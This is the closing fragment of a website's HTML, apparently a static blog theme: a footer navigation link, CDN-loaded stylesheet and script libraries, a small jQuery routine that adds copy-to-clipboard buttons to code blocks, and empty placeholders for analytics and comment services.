       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
